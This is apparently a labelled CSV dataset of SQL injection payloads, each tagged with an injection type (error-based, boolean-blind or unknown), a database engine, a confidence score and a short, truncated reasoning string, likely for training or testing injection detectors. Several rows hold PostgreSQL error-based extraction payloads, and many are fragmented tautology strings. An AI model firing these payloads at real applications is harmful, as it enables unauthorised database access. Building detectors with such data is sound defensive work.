id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
39744,"select * from users WHERE username = ""-3499\' ) ) ) and username = ""-8069\' ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39745,"-1344 ) as gqgi where 2545 = 2545 and username = ""-1254"" and username = ""-1254"" or username = ""1 ) and ( 3530 = 3530",unknown,generic,0.50,Insufficient data to classify payload type,1
39746,"-5863"" and ( ( ( \'itxy\' like \'itxy"" and username = ""-6179 ) ) and ( ( 7732 = 7732",unknown,generic,0.50,Insufficient data to classify payload type,1
39747,"-3499\' ) ) ) and username = ""-9742 ) where 8409 = 8409 or username = ""-1254",unknown,generic,0.50,Insufficient data to classify payload type,1
39748,-1854\' ) as fmmq where 7326 = 7326 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39749,"select * from users WHERE username = ""-5863"" and ( ( 5139 = 5139"" or username = ""-1254"" and username = ""1\' ) ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39750,"select * from users WHERE username = ""1%\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'%\' = \'"" or username = ""-1254"" and username = ""-7072\' )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39751,"-3613%\' ) and username = ""1\' ) ) ) and ( ( ( \'abcf\' like \'abcf",unknown,generic,0.50,Insufficient data to classify payload type,1
39752,"select * from users WHERE username = ""-5313\' ) ) ) or username = ""1"" and username = ""1\' ) as wpmv where 1479 = 1479",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39753,"-5313\' ) ) ) and username = ""1 ) ) ) and ( ( ( 4694 = 4694",unknown,generic,0.50,Insufficient data to classify payload type,1
39754,"select * from users WHERE username = ""1\' and \'fbzo\' like \'fbzo"" and username = ""1\'+ ( select onzd where 8452 = 8452",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39755,"select * from users WHERE username = ""1\' ) or username = ""-1254"" and username = ""-2495 ) ) as hudw where 4197 = 4197",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39756,"select * from users WHERE username = ""1"" and username = ""1"" and username = ""1\' ) ) ) or username = ""-2374 )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39757,"-9770\' ) ) as ovhh where 7903 = 7903 or username = ""-8007\' ) ) as bgpp where 9555 = 9555 and username = ""-6523",unknown,generic,0.50,Insufficient data to classify payload type,1
39758,"select * from users WHERE username = ""-1254"" and ( ( ( \'sbey\' = \'sbey"" and username = ""-6179 ) )",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
39759,"-6190\' ) where 2621 = 2621 or username = ""-1254"" and username = ""-8069\' ) ) and ( ( \'qbvz\' = \'qbvz",unknown,generic,0.50,Insufficient data to classify payload type,1
39760,"-6353%\' ) ) and username = ""-5863"" and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'%\' = \'",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39761,"select * from users WHERE username = ""-3733\' ) ) and username = ""-8007\' ) ) as bgpp where 9555 = 9555 or username = ""1\'",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39762,"select * from users WHERE username = ""-1254"" or username = ""1\'|| ( select \'tisi\' from dual where 1616 = 1616 and username = ""-2756\' where 6156 = 6156",boolean_blind,oracle,0.85,Boolean Blind detected: SQL structure with complex syn (oracle),1
39763,"-8007\' ) ) as bgpp where 9555 = 9555 or username = ""1\' and username = ""1\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'iuki\' = \'iuki",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39764,"1 and username = ""-8007\' ) ) as bgpp where 9555 = 9555 or username = ""1\' ) where 1502 = 1502 and ( ( 5616 = 5616",unknown,generic,0.50,Insufficient data to classify payload type,1
39765,"-6353%\' ) ) and ( ( \'%\' = \'"" and ( ( ( \'mfmk\' = \'mfmk"" or username = ""1\' ) and ( ( \'ajka\' = \'ajka"" and username = ""-1985 ) ) ) and ( ( ( 1248 = 1248",unknown,generic,0.50,Insufficient data to classify payload type,1
39766,"select * from users WHERE username = ""1"" and ( ( \'%\' = \'"" or username = ""1 )",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
39767,"select * from users WHERE username = ""-8163 ) ) as cvai where 2360 = 2360 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" or username = ""1\' ) ) )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39768,"1\' ) ) as plbt where 4368 = 4368 and username = ""-7430\' ) as xfah where 1596 = 1596 and username = ""1",unknown,generic,0.50,Insufficient data to classify payload type,1
39769,"select * from users WHERE username = ""-9688%\' ) ) or username = ""-8007\' ) ) as bgpp where 9555 = 9555 and username = ""-7874 ) ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
